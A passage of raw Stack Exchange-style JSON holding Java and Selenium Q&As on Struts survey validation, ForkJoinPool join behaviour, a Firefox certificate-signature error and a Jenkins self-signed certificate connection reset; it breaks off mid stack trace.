cssClass=&quot;form-control&quot; maxlength=&quot;charactersLimit&quot; value=&quot;#parameters.%{'question_' + surveyQuestionId}&quot; /&gt;\n\n    &lt;s:radio name=&quot;question_%{surveyQuestionId}&quot; value=&quot;#parameters.%{'question_' + surveyQuestionId}&quot; list=&quot;#{'true':'Yes','false':'No'}&quot; cssClass=&quot;radioMarginRight&quot; /&gt;\n</code></pre>\n<p>Below is the action mapping for survey submit action</p>\n<pre class=\"lang-html prettyprint-override\"><code>&lt;action name=&quot;survey/submitFeedback&quot; class=&quot;surveyAction&quot; method=&quot;submitFeedback&quot;&gt;\n    &lt;result name=&quot;success&quot; type=&quot;tiles&quot;&gt;survey.submit&lt;/result&gt;\n    &lt;result name=&quot;error&quot; type=&quot;tiles&quot;&gt;survey.view&lt;/result&gt;\n    &lt;param name=&quot;public&quot;&gt;true&lt;/param&gt;\n&lt;/action&gt;\n</code></pre>\n<p>Here is the code in Action class handling the submit logic:</p>\n<pre><code>private Integer npsScore = 0;\nprivate Map&lt;String, String[]&gt; surveyResponseQuestionAnswerMap = new HashMap&lt;&gt;();\n\n    public String submitFeedback() {\n\n    try {\n        if (requestId == null) {\n            addActionError(&quot;Request Id missing! Invalid Request!&quot;);\n            throw new Exception(&quot;Invalid Request!&quot;);\n        }\n        \n        surveyRequest = surveyService.getSurveyRequestByUUID(requestId);\n        if (surveyRequest == null) {\n            addActionError(&quot;Request Id Invalid! Invalid Request!&quot;);\n            throw new Exception(&quot;Request Id Invalid! Invalid Request!&quot;);\n        }\n        loadQuestionAnswersMap();\n        validateSurveyFeedback();\n        \n        if (hasErrors()) {\n            throw new Exception(&quot;Error submitting response!&quot;);\n        } else {\n            surveyService.parseAndSaveSurveyResponse(surveyRequest, surveyResponseQuestionAnswerMap);\n            setSurveyCustomMessages(surveyService.getSurveyCustomMessagesSettingBySurveyId(survey.getSurveyId()));\n        }\n        return SUCCESS;\n    } catch (Exception e) {\n        addActionError(&quot;Error submitting response!&quot;);\n        logger.error(e);\n        loadSurvey();\n        return ERROR;\n    }\n}\n\nprivate void loadQuestionAnswersMap() {\n    HttpServletRequest httpRequest = ActionUtil.getRequest();\n    Enumeration&lt;String&gt; parameterNames = httpRequest.getParameterNames();\n    while (parameterNames.hasMoreElements()) {\n        String parameterName = parameterNames.nextElement();\n        if (parameterName.startsWith(&quot;question_&quot;)) {\n            String[] values = httpRequest.getParameterValues(parameterName);\n            if (values != null) {\n                surveyResponseQuestionAnswerMap.put(parameterName, values);\n            }\n        }\n    }\n}\n\nprivate void validateSurveyFeedback() throws Exception {\n    \n    HttpServletRequest httpRequest = ActionUtil.getRequest();\n    Survey survey = surveyRequest.getSurvey();\n    if (survey.isUseNetPromotorScore()) {\n        String npsScoreStr = httpRequest.getParameter(&quot;npsScore&quot;);\n        if (StringUtils.isBlank(npsScoreStr)) {\n            this.addFieldError(&quot;npsScore&quot;, &quot;Answer is required&quot;);\n        } else {\n            setNpsScore(Integer.valueOf(npsScoreStr));\n        }\n    }\n    List&lt;SurveyQuestion&gt; requiredQuestions = surveyQuestionService.getRequiredSurveyQuestionsForSurvey(surveyRequest.getSurvey());\n    for (SurveyQuestion requiredQuestion : requiredQuestions) {\n        Integer requiredQuestionId = requiredQuestion.getSurveyQuestionId();\n        String requiredQuestionFieldParameterName = &quot;question_&quot; + requiredQuestionId;\n        logger.info(&quot;Required Question Field Parameter Name: &quot; + requiredQuestionFieldParameterName);\n        String[] answers = httpRequest.getParameterValues(requiredQuestionFieldParameterName);\n        if (answers == null) {\n            this.addFieldError(requiredQuestionFieldParameterName, &quot;Answer is required&quot;);\n        } else {\n            boolean noValue = true;\n            for (String answer : answers) {\n                if (StringUtils.isNotBlank(answer)) {\n                    noValue = false;\n                    break;\n                }\n            }\n            if (noValue) {\n                this.addFieldError(requiredQuestionFieldParameterName, &quot;Answer is required&quot;);\n            }\n        }\n    }\n}\n</code></pre>\n"},{"tags":["java","multithreading","forkjoinpool"],"comments":[{"owner":{"account_id":2994830,"reputation":1,"user_id":2541560,"display_name":"Kayaman"},"score":0,"creation_date":1640249546,"post_id":70459373,"comment_id":124551528,"body_markdown":"&quot;but it seems like it is actually blocked on it&quot;, how does it seem that way? Are you using `getActiveCount()` and see that there&#39;s one less thread active than should be? Include the relevant parts of your code to show how you&#39;re using FJP.","body":"&quot;but it seems like it is actually blocked on it&quot;, how does it seem that way? Are you using <code>getActiveCount()</code> and see that there&#39;s one less thread active than should be? Include the relevant parts of your code to show how you&#39;re using FJP."},{"owner":{"account_id":4096887,"reputation":826,"user_id":3363386,"display_name":"polo-language"},"score":0,"creation_date":1640249728,"post_id":70459373,"comment_id":124551586,"body_markdown":"Just because a thread is in a blocked state does not mean that it is sitting on a physical CPU core, preventing it from doing other work. The runtime or OS can/will schedule other threads on the core it was using.","body":"Just because a thread is in a blocked state does not mean that it is sitting on a physical CPU core, preventing it from doing other work. The runtime or OS can/will schedule other threads on the core it was using."},{"owner":{"account_id":23726661,"reputation":19,"user_id":17746476,"display_name":"Yoav Rodeh"},"score":0,"creation_date":1640253197,"post_id":70459373,"comment_id":124552710,"body_markdown":"I see it is blocked by running an example: it forks all the sub-jobs, and I see that the number of active ones is smaller than what I would expect. When I change to invokeAll, the number indeed increases by 1. But still, when the job that is running on the main thread (which is now running the first job), is finished, it doesn&#39;t pick up another one, but rather is blocked on the join.","body":"I see it is blocked by running an example: it forks all the sub-jobs, and I see that the number of active ones is smaller than what I would expect. When I change to invokeAll, the number indeed increases by 1. But still, when the job that is running on the main thread (which is now running the first job), is finished, it doesn&#39;t pick up another one, but rather is blocked on the join."},{"owner":{"account_id":23726661,"reputation":19,"user_id":17746476,"display_name":"Yoav Rodeh"},"score":0,"creation_date":1640253265,"post_id":70459373,"comment_id":124552733,"body_markdown":"Indeed, the scheduler will let other stuff run - but there is no other stuff! I want it to start running the rest of the jobs (i have 80 jobs, and the pool is of size 16)","body":"Indeed, the scheduler will let other stuff run - but there is no other stuff! I want it to start running the rest of the jobs (i have 80 jobs, and the pool is of size 16)"}],"answers":[{"tags":[],"owner":{"account_id":4096887,"reputation":826,"user_id":3363386,"display_name":"polo-language"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1640254376,"creation_date":1640254376,"answer_id":70460611,"question_id":70459373,"body_markdown":"`ForkJoinPool` is designed to prevent you having to think about thread utilization in this way. The &#39;work stealing&#39; algorithm ensures that each thread is always busy so long as there are tasks in the queue.\r\n\r\nCheck out these notes for a high-level discussion:\r\nhttps://www.dre.vanderbilt.edu/~schmidt/cs891f/2018-PDFs/L4-ForkJoinPool-pt3.pdf\r\n\r\nTo see the ugly details go down the rabbit hole of the `ForkJoinPool#awaitJoin` [source][1].\r\n\r\nRoughly, if I&#39;m reading the (very complex) code correctly: When a thread `join`s a sub-task, it attempts to complete that task itself, otherwise if the sub-task&#39;s worker queue is non-empty (i.e. it is also depending on other tasks), the joining thread repeatedly attempts to complete one of those tasks, via `ForkJoinPool#tryHelpStealer`, whose Javadoc entry provides some insight:\r\n\r\n&gt; Tries to locate and execute tasks for a stealer of the given\r\ntask, or in turn one of its stealers, Traces currentSteal -&gt;\r\ncurrentJoin links looking for a thread working on a descendant\r\nof the given task and with a non-empty queue to steal back and\r\nexecute tasks from. The first call to this method upon a\r\nwaiting join will often entail scanning/search, (which is OK\r\nbecause the joiner has nothing better to do), but this method\r\nleaves hints in workers to speed up subsequent calls. The\r\nimplementation is very branchy to cope with potential\r\ninconsistencies or loops encountering chains that are stale,\r\nunknown, or so long that they are likely cyclic.\r\n\r\nNotice that `ForkJoinTask` does not extend `Thread`, so &#39;blocking&#39; of the `join` operation means something different here than usual. It doesn&#39;t mean that the underlying thread is in a blocked state, rather it means that the computation of the current task is held up further up the call stack while `join` goes off and attempts to resolve the tree of sub-tasks impeding progress.\r\n\r\n  [1]: https://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/concurrent/ForkJoinPool.java#l1999","title":"does join of ForkJoinPool block the current thread worker?","body":"<p><code>ForkJoinPool</code> is designed to prevent you having to think about thread utilization in this way. The 'work stealing' algorithm ensures that each thread is always busy so long as there are tasks in the queue.</p>\n<p>Check out these notes for a high-level discussion:\n<a href=\"https://www.dre.vanderbilt.edu/%7Eschmidt/cs891f/2018-PDFs/L4-ForkJoinPool-pt3.pdf\" rel=\"nofollow noreferrer\">https://www.dre.vanderbilt.edu/~schmidt/cs891f/2018-PDFs/L4-ForkJoinPool-pt3.pdf</a></p>\n<p>To see the ugly details go down the rabbit hole of the <code>ForkJoinPool#awaitJoin</code> <a href=\"https://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/concurrent/ForkJoinPool.java#l1999\" rel=\"nofollow noreferrer\">source</a>.</p>\n<p>Roughly, if I'm reading the (very complex) code correctly: When a thread <code>join</code>s a sub-task, it attempts to complete that task itself, otherwise if the sub-task's worker queue is non-empty (i.e. it is also depending on other tasks), the joining thread repeatedly attempts to complete one of those tasks, via <code>ForkJoinPool#tryHelpStealer</code>, whose Javadoc entry provides some insight:</p>\n<blockquote>\n<p>Tries to locate and execute tasks for a stealer of the given\ntask, or in turn one of its stealers, Traces currentSteal -&gt;\ncurrentJoin links looking for a thread working on a descendant\nof the given task and with a non-empty queue to steal back and\nexecute tasks from. The first call to this method upon a\nwaiting join will often entail scanning/search, (which is OK\nbecause the joiner has nothing better to do), but this method\nleaves hints in workers to speed up subsequent calls. The\nimplementation is very branchy to cope with potential\ninconsistencies or loops encountering chains that are stale,\nunknown, or so long that they are likely cyclic.</p>\n</blockquote>\n<p>Notice that <code>ForkJoinTask</code> does not extend <code>Thread</code>, so 'blocking' of the <code>join</code> operation means something different here than usual. It doesn't mean that the underlying thread is in a blocked state, rather it means that the computation of the current task is held up further up the call stack while <code>join</code> goes off and attempts to resolve the tree of sub-tasks impeding progress.</p>\n"}],"owner":{"account_id":23726661,"reputation":19,"user_id":17746476,"display_name":"Yoav Rodeh"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1218,"favorite_count":0,"down_vote_count":1,"up_vote_count":2,"answer_count":1,"score":1,"last_activity_date":1640254376,"creation_date":1640247425,"question_id":70459373,"body_markdown":"I&#39;m trying to run a number of jobs concurrently using Java&#39;s `ForkJoinPool`. The main task (which is already running in the pool) spawns all the jobs and then does a series of joins. I was sure that a task calling `join` would free the thread it is running in, but it seems like it is actually blocked on it, and therefore it is &quot;wasting&quot; the thread, i.e., since the number of threads equals the number of CPU cores, one core will be inactive.\r\n\r\nI know that if I run `invokeAll` instead, then the first of the sub-jobs gets to run in the same thread, and indeed this works. However, this seems sub-optimal, because if the first task is actually a very fast one, i have the same problem. One of the threads is blocked waiting on `join`. There are more jobs than threads, so I would rather another one of the jobs gets started.\r\n\r\nI can try and bypass all this manually but its not so nice, and it seems like I am redoing what `ForkJoinPool` is supposed to do.\r\nSo the question is: Am I understanding `ForkJoinPool` wrong? or if what I&#39;m saying is correct, then is there simple way to utilize the threads more efficiently?\r\n ","title":"does join of ForkJoinPool block the current thread worker?","body":"<p>I'm trying to run a number of jobs concurrently using Java's <code>ForkJoinPool</code>. The main task (which is already running in the pool) spawns all the jobs and then does a series of joins. I was sure that a task calling <code>join</code> would free the thread it is running in, but it seems like it is actually blocked on it, and therefore it is &quot;wasting&quot; the thread, i.e., since the number of threads equals the number of CPU cores, one core will be inactive.</p>\n<p>I know that if I run <code>invokeAll</code> instead, then the first of the sub-jobs gets to run in the same thread, and indeed this works. However, this seems sub-optimal, because if the first task is actually a very fast one, i have the same problem. One of the threads is blocked waiting on <code>join</code>. There are more jobs than threads, so I would rather another one of the jobs gets started.</p>\n<p>I can try and bypass all this manually but its not so nice, and it seems like I am redoing what <code>ForkJoinPool</code> is supposed to do.\nSo the question is: Am I understanding <code>ForkJoinPool</code> wrong? or if what I'm saying is correct, then is there simple way to utilize the threads more efficiently?</p>\n"},{"tags":["java","selenium","firefox","geckodriver","selenium-firefoxdriver"],"comments":[{"owner":{"account_id":3716127,"reputation":18090,"user_id":3092298,"accept_rate":84,"display_name":"Greg Burghardt"},"score":0,"creation_date":1560948270,"post_id":56667550,"comment_id":99903626,"body_markdown":"Is something else on that machine running on the same port that Selenium is trying to connect to? (And is that thing requiring a secure connection with an invalid SSL certificate?)","body":"Is something else on that machine running on the same port that Selenium is trying to connect to? (And is that thing requiring a secure connection with an invalid SSL certificate?)"},{"owner":{"account_id":3854050,"reputation":23587,"user_id":3193455,"accept_rate":94,"display_name":"Saurabh Gaur"},"score":0,"creation_date":1560948684,"post_id":56667550,"comment_id":99903909,"body_markdown":"Have a look here https://stackoverflow.com/questions/42359835/selenium-firefox-webdriverexception-reached-error-page-aboutcerterror","body":"Have a look here <a href=\"https://stackoverflow.com/questions/42359835/selenium-firefox-webdriverexception-reached-error-page-aboutcerterror\" title=\"selenium firefox webdriverexception reached error page aboutcerterror\">stackoverflow.com/questions/42359835/&hellip;</a>"},{"owner":{"account_id":10049107,"reputation":186627,"user_id":7429447,"accept_rate":86,"display_name":"undetected Selenium"},"score":0,"creation_date":1560952986,"post_id":56667550,"comment_id":99906685,"body_markdown":"@NarasimhaRao Do you use any anti virus e.g. Avast?","body":"@NarasimhaRao Do you use any anti virus e.g. Avast?"}],"answers":[{"tags":[],"owner":{"account_id":6210790,"reputation":11,"user_id":4837141,"display_name":"tojazenn"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1568979369,"creation_date":1568971062,"answer_id":58025423,"question_id":56667550,"body_markdown":"I have noticed that random pages are being blocked by Firefox - `SEC_ERROR_BAD_SIGNATURE` is displayed. Other browsers were fine.\r\n\r\n**SOLUTION** \r\n\r\nRenaming two files has &#39;reset&#39; firefox files and resolved the above issue.\r\n\r\n* cert8.db to cert8.db.old\r\n* cert9.db to cert9.db.old\r\n\r\nWindows 10 directory:\r\n`C:\\Users\\YOURUSERNAME\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\yuic7va7.default `\r\n\r\nwhere `YOURUSERNAME` is the name of your Windows profile&lt;br&gt;\r\nand\r\n\r\n`yuic7va7.default` is a default, and probably random, name of the Firefox profile.\r\n\r\nThe above worked on 69.0.1 (64-bit) Firefox, Windows 10 and Windows 7 computers.","title":"Peers certificate has an invalid signature. Error code: SEC_ERROR_BAD_SIGNATURE error with Selenium GeckoDriver and Firefox through Java","body":"<p>I have noticed that random pages are being blocked by Firefox - <code>SEC_ERROR_BAD_SIGNATURE</code> is displayed. Other browsers were fine.</p>\n\n<p><strong>SOLUTION</strong> </p>\n\n<p>Renaming two files has 'reset' firefox files and resolved the above issue.</p>\n\n<ul>\n<li>cert8.db to cert8.db.old</li>\n<li>cert9.db to cert9.db.old</li>\n</ul>\n\n<p>Windows 10 directory:\n<code>C:\\Users\\YOURUSERNAME\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\yuic7va7.default</code></p>\n\n<p>where <code>YOURUSERNAME</code> is the name of your Windows profile<br>\nand</p>\n\n<p><code>yuic7va7.default</code> is a default, and probably random, name of the Firefox profile.</p>\n\n<p>The above worked on 69.0.1 (64-bit) Firefox, Windows 10 and Windows 7 computers.</p>\n"}],"owner":{"account_id":16165085,"reputation":11,"user_id":11670254,"display_name":"Narasimha Rao"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":12511,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640253930,"creation_date":1560946979,"question_id":56667550,"body_markdown":"Connecting to one website. After typing login and password values, when clicked on Sign IN button, seeing the below error on the UI.\r\n\r\n    Secure Connection Failed\r\n    \r\n    An error occurred during a connection to wgateway-fit.nj.adp.com. Peers certificate has an invalid signature. Error code: SEC_ERROR_BAD_SIGNATURE\r\n\r\nWe are using Selenium c#. Firefox Browser 66\r\n\r\n    FirefoxOptions option = new FirefoxOptions();\r\n    //option.BrowserExecutableLocation = @&quot;C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe&quot;;   \r\n    option.BrowserExecutableLocation = @&quot;C:\\Users\\buskarna\\AppData\\Local\\Mozilla Firefox\\firefox.exe&quot;;\r\n    option.AcceptInsecureCertificates = true;\r\n    option.SetPreference(&quot;browser.helperApps.neverAsk.saveToDisk&quot;, &quot;text/html;charset=iso-8859-1,application/dat,application/pdf,text/plain,text/csv,application/x-msexcel,application/excel,application/x-excel,application/octet-stream,application/download,text/x-csv&quot;);\r\n    option.SetPreference(&quot;browser.helperApps.neverAsk.openFile&quot;, &quot;text/html;charset=iso-8859-1,application/dat,application/pdf,text/plain,text/csv,application/x-msexcel,application/excel,application/x-excel,application/octet-stream,application/download,text/x-csv&quot;);\r\n    option.SetPreference(&quot;browser.download.folderList&quot;, 2);\r\n    option.SetPreference(&quot;browser.download.dir&quot;, &quot;C:\\\\Temp\\\\&quot;);\r\n    option.SetPreference(&quot;plugin.disable_full_page_plugin_for_types&quot;, &quot;application/pdf,application/vnd.fdf&quot;);\r\n    option.SetPreference(&quot;browser.download.manager.alertOnEXEOpen&quot;, false);\r\n    option.SetPreference(&quot;browser.download.manager.useWindow&quot;, false);\r\n    option.SetPreference(&quot;browser.download.manager.showAlertOnComplete&quot;, false);\r\n    option.SetPreference(&quot;browser.download.manager.closeWhenDone&quot;, true);\r\n    option.SetPreference(&quot;browser.helperApps.alwaysAsk.force&quot;, false);\r\n    option.SetPreference(&quot;pdfjs.disabled&quot;, true);","title":"Peers certificate has an invalid signature. Error code: SEC_ERROR_BAD_SIGNATURE error with Selenium GeckoDriver and Firefox through Java","body":"<p>Connecting to one website. After typing login and password values, when clicked on Sign IN button, seeing the below error on the UI.</p>\n\n<pre><code>Secure Connection Failed\n\nAn error occurred during a connection to wgateway-fit.nj.adp.com. Peers certificate has an invalid signature. Error code: SEC_ERROR_BAD_SIGNATURE\n</code></pre>\n\n<p>We are using Selenium c#. Firefox Browser 66</p>\n\n<pre><code>FirefoxOptions option = new FirefoxOptions();\n//option.BrowserExecutableLocation = @\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\";   \noption.BrowserExecutableLocation = @\"C:\\Users\\buskarna\\AppData\\Local\\Mozilla Firefox\\firefox.exe\";\noption.AcceptInsecureCertificates = true;\noption.SetPreference(\"browser.helperApps.neverAsk.saveToDisk\", \"text/html;charset=iso-8859-1,application/dat,application/pdf,text/plain,text/csv,application/x-msexcel,application/excel,application/x-excel,application/octet-stream,application/download,text/x-csv\");\noption.SetPreference(\"browser.helperApps.neverAsk.openFile\", \"text/html;charset=iso-8859-1,application/dat,application/pdf,text/plain,text/csv,application/x-msexcel,application/excel,application/x-excel,application/octet-stream,application/download,text/x-csv\");\noption.SetPreference(\"browser.download.folderList\", 2);\noption.SetPreference(\"browser.download.dir\", \"C:\\\\Temp\\\\\");\noption.SetPreference(\"plugin.disable_full_page_plugin_for_types\", \"application/pdf,application/vnd.fdf\");\noption.SetPreference(\"browser.download.manager.alertOnEXEOpen\", false);\noption.SetPreference(\"browser.download.manager.useWindow\", false);\noption.SetPreference(\"browser.download.manager.showAlertOnComplete\", false);\noption.SetPreference(\"browser.download.manager.closeWhenDone\", true);\noption.SetPreference(\"browser.helperApps.alwaysAsk.force\", false);\noption.SetPreference(\"pdfjs.disabled\", true);\n</code></pre>\n"},{"tags":["java","rest","ssl","jenkins","keystore"],"comments":[{"owner":{"account_id":3707380,"reputation":3398,"user_id":3085520,"accept_rate":64,"display_name":"prem"},"score":0,"creation_date":1594020866,"post_id":62751141,"comment_id":110968913,"body_markdown":"Are you using self signed certificate?","body":"Are you using self signed certificate?"},{"owner":{"account_id":14173206,"reputation":277,"user_id":10239245,"display_name":"Sachin Bhatia"},"score":0,"creation_date":1594021379,"post_id":62751141,"comment_id":110969137,"body_markdown":"Yes I&#39;m using Self Signed Certificate","body":"Yes I&#39;m using Self Signed Certificate"},{"owner":{"account_id":151394,"reputation":52351,"user_id":365237,"accept_rate":96,"display_name":"eis"},"score":0,"creation_date":1594021761,"post_id":62751141,"comment_id":110969302,"body_markdown":"you have https url, are you using httpurlconnection istead of httpsurlconnection on purpose?","body":"you have https url, are you using httpurlconnection istead of httpsurlconnection on purpose?"},{"owner":{"account_id":14173206,"reputation":277,"user_id":10239245,"display_name":"Sachin Bhatia"},"score":0,"creation_date":1594022308,"post_id":62751141,"comment_id":110969510,"body_markdown":"I&#39;m dealing with HTTP or HTTPS both type of URLs that&#39;s why i&#39;m using httpurlconnection","body":"I&#39;m dealing with HTTP or HTTPS both type of URLs that&#39;s why i&#39;m using httpurlconnection"},{"owner":{"account_id":14173206,"reputation":277,"user_id":10239245,"display_name":"Sachin Bhatia"},"score":0,"creation_date":1594097814,"post_id":62751141,"comment_id":110998819,"body_markdown":"same error is coming with httpsurlconnection too","body":"same error is coming with httpsurlconnection too"}],"answers":[{"tags":[],"owner":{"account_id":4243,"reputation":1301840,"user_id":6309,"accept_rate":100,"display_name":"VonC"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1594246268,"creation_date":1594246268,"answer_id":62804410,"question_id":62751141,"body_markdown":"When it runs in the Jenkins plugin, that means it is loaded and executed on an agent.  \r\nEven if that agent was the same machine as the Jenkins main instance:\r\n\r\n- the environment can be different\r\n- the JDK used might be different (in which case, the `jdk/jre/lib/security/cacerts` modified might not be the same)\r\n\r\nYou need to check those two points. Each Jenkins job, once executed, has an environment section which can provide more clues.","title":"Getting java.net.SocketException: Connection reset with (SSL- Self Signed Certificate) while invoking API From Jenkins Plugin","body":"<p>When it runs in the Jenkins plugin, that means it is loaded and executed on an agent.<br />\nEven if that agent was the same machine as the Jenkins main instance:</p>\n<ul>\n<li>the environment can be different</li>\n<li>the JDK used might be different (in which case, the <code>jdk/jre/lib/security/cacerts</code> modified might not be the same)</li>\n</ul>\n<p>You need to check those two points. Each Jenkins job, once executed, has an environment section which can provide more clues.</p>\n"},{"tags":[],"owner":{"account_id":7843924,"reputation":7996,"user_id":5929559,"display_name":"Alex O"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1594584074,"creation_date":1594584074,"answer_id":62865908,"question_id":62751141,"body_markdown":"**Create a custom trust store**, add your certificate, and pass that trust store to Jenkins via `-Djavax.net.ssl.trustStore=/path/to/store` (see [this help][1] for details).\r\n\r\nThis should resolve any ambiguity about whether you modified the proper system trust store or not. Also, you&#39;ll avoid all the risks that come with modifying the system trust store.\r\n\r\n\r\n  [1]: https://support.cloudbees.com/hc/en-us/articles/203821254-How-to-install-a-new-SSL-certificate","title":"Getting java.net.SocketException: Connection reset with (SSL- Self Signed Certificate) while invoking API From Jenkins Plugin","body":"<p><strong>Create a custom trust store</strong>, add your certificate, and pass that trust store to Jenkins via <code>-Djavax.net.ssl.trustStore=/path/to/store</code> (see <a href=\"https://support.cloudbees.com/hc/en-us/articles/203821254-How-to-install-a-new-SSL-certificate\" rel=\"nofollow noreferrer\">this help</a> for details).</p>\n<p>This should resolve any ambiguity about whether you modified the proper system trust store or not. Also, you'll avoid all the risks that come with modifying the system trust store.</p>\n"}],"owner":{"account_id":14173206,"reputation":277,"user_id":10239245,"display_name":"Sachin Bhatia"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":6471,"favorite_count":0,"down_vote_count":0,"up_vote_count":11,"answer_count":2,"score":11,"last_activity_date":1640253535,"creation_date":1594020297,"question_id":62751141,"body_markdown":"I have a sample Java Program which connects to a particular URL and calls an API that Use Self-Signed Certificate. \r\n\r\nThe code being called is as follows:\r\n\r\n```\r\nimport java.io.BufferedReader;\r\nimport java.io.IOException;\r\nimport java.io.InputStreamReader;\r\nimport java.net.HttpURLConnection;\r\nimport java.net.MalformedURLException;\r\nimport java.net.URI;\r\n\r\nimport javax.ws.rs.core.UriBuilder;\r\n\r\npublic class test {\r\n\r\n\tpublic static void main(String[] args) throws MalformedURLException, IOException {\r\n\t\r\n\t\tURI uri = UriBuilder.fromPath(&quot;https://test1.com/&quot;).path(&quot;test/AuthorizedUser&quot;).queryParam(&quot;userName&quot;, &quot;abc@test.com&quot;).queryParam(&quot;Password&quot;, &quot;Password1&quot;).build();\r\n\r\n\t\tHttpURLConnection connection = (HttpURLConnection) uri.toURL().openConnection();\r\n\r\n\t\tconnection.setRequestMethod(&quot;GET&quot;);\r\n\t\tconnection.setRequestProperty(&quot;Authorization&quot;, &quot;NoAuth &quot;);\r\n\t\tconnection.setRequestProperty(&quot;Accept&quot;, &quot;application/json&quot;);\r\n\t\t\r\n\t\tconnection.connect();\r\n\t\t\r\n\t\tint responseCode = connection.getResponseCode();\r\n\t\t\r\n\t\tif (responseCode == HttpURLConnection.HTTP_OK)\r\n\t\t{\r\n\t\t\tBufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\r\n\t\t\tString inputLine;\r\n\t\t\tStringBuffer response = new StringBuffer();\r\n\r\n\t\t\twhile ((inputLine = in.readLine()) != null) {\r\n\t\t\t\tresponse.append(inputLine);\r\n\t\t\t}\r\n\t\t\tin.close();\r\n\r\n\t\t\tString result = response.toString();\r\n\t\t\tSystem.out.println(result);\r\n\t\t}\r\n\r\n\t}\r\n\r\n```\r\nAbove mentioned program is working with Java When I installed SSL Certificate in JVM&#39;s trust store using these commands:\r\n\r\n    C:\\Program Files\\Java\\jre1.8.0_131\\bin\\keytool.exe&quot; -import -file &quot;C:\\Users\\user1\\Desktop\\test1.cer&quot; -keystore &quot;C:\\Program Files\\Java\\jre1.8.0_131\\lib\\security\\cacerts&quot; -alias &quot;Test1_certificate\r\n\r\n    C:\\Program Files\\Java\\jdk1.8.0_131\\bin\\keytool.exe&quot; -import -file &quot;C:\\Users\\user1\\Desktop\\test1.cer&quot; -keystore &quot;C:\\Program Files\\Java\\jdk1.8.0_131\\jre\\lib\\security\\cacerts&quot; -alias &quot;Test1_certificate\r\n\r\nThe problem is that when same code is running from Jenkins Plugin, I am getting this error : \r\n\r\n```\r\njava.net.SocketException: Connection reset\r\n\tat java.net.SocketInputStream.read(SocketInputStream.java:210)\r\n\tat java.net.SocketInputStream.read(SocketInputStream.java:141)\r\n\tat sun.security.ssl.InputRecord.readFully(InputRecord.java:465)\r\n\tat sun.security.ssl.InputRecord.read(InputRecord.java:503)\r\n\tat sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973)\r\n\tat sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375)\r\n\tat sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403)\r\n\tat sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387)\r\n\tat sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559)\r\n\tat sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185)\r\n\tat sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153)\r\n\tat com.ssts.restcalls.HTTPClientRestCall.GetInputStream(HTTPClientRestCall.java:92)\r\n\tat com.test.restcalls.HTTPClientRestCall.Get(HTTPClientRestCall.java:20)\r\n\tat com.test.restcalls.HttpRestCalls.authenticateUser(JerseyRestCalls.java:59)\r\n\tat com.test.cloud.aCloud.CloudBuilder$DescriptorImpl.AuthenticateUser(CloudBuilder.java:798)\r\n\tat com.test.cloud.acloud.CloudBuilder$DescriptorImpl.checkCredentials(CloudBuilder.java:1060)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:498)\r\n\tat org.kohsuke.stapler.Function$InstanceFunction.invoke(Function.java:298)\r\n\tat org.kohsuke.stapler.Function.bindAndInvoke(Function.java:161)\r\n\tat org.kohsuke.stapler.Function.bindAndInvokeAndServeResponse(Function.java:96)\r\n\tat org.kohsuke.stapler.MetaClass$JavaScriptProxyMethodDispatcher.doDispatch(MetaClass.java:490)\r\n\tat org.kohsuke.stapler.NameBasedDispatcher.dispatch(NameBasedDispatcher.java:53)\r\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:746)\r\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:876)\r\n\tat org.kohsuke.stapler.MetaClass$13.dispatch(MetaClass.java:411)\r\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:746)\r\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:876)\r\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:813)\r\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:876)\r\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:649)\r\n\tat org.kohsuke.stapler.Stapler.service(Stapler.java:199)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:790)\r\n\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:812)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1669)\r\n\tat hudson.util.PluginServletFilter$1.doFilter(PluginServletFilter.java:132)\r\n\tat hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:123)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\r\n\tat hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:49)\r\n\tat 